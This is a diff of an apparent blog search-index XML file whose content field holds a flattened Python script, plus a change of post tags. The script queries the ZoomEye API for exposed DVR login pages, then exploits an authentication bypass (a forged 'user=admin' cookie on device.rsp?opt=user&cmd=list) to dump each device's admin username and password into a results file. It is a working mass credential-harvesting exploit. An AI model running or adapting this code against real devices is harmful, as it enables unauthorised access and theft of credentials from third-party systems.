@@ -6,11 +6,16 @@
     <content type="text"><![CDATA[testtest testtesttesttesttesttesttesttesttesttest 123456789101112131415161718192021222324252627282930313233import requests,json,sys,timedef zoomeye(): url = 'https://api.zoomeye.org/user/login' data = &#123;"username": "x","password": "x"&#125; req = requests.post(url,data=json.dumps(data)) x = 'JWT '+eval(req.text).get('access_token') for i in range(501): time.sleep(1) url = 'https://api.zoomeye.org/host/search?query=/login.rsp&amp;page='+str(i+1) s = requests.get(url,headers=&#123;'Authorization': x&#125;) z =json.loads(s.text).get('matches')&lt;!-- more --&gt; for i in range(100): try: print i ss = str(z[i].get('ip')+':'+str(z[i].get('portinfo').get('port'))) url = "http://"+ss.strip()+"/login.rsp" url1 ="http://"+ss.strip()+"/device.rsp?opt=user&amp;cmd=list" s1 = requests.get(url1,headers=&#123;'Cookie':'user=admin'&#125;) c = s1.json() uid = c.get('list')[0].get('uid') pwd = c.get('list')[0].get('pwd') with open("result.txt",'a') as y: y.write(url+ ' Username: '+uid+' Password:'+pwd+'\n') except: passif __name__ == '__main__': zoomeye()]]></content>
       <tags>
         <tag>python</tag>
-        <tag>�ڿ�</tag>
-        <tag>��ȫ</tag>
-        <tag>���˵�</tag>
-        <tag>MSF</tag>
-        <tag>��͸</tag>
+        <tag>爬虫</tag>
+        <tag>Tools</tag>
+        <tag>note</tag>
+        <tag>日记</tag>
+        <tag>Dream</tag>
+        <tag>海贼王</tag>
+        <tag>进击的巨人</tag>
+        <tag>柯南</tag>
+        <tag>宇西</tag>
+        <tag>莫文蔚</tag>
       </tags>
   </entry>
   <entry>
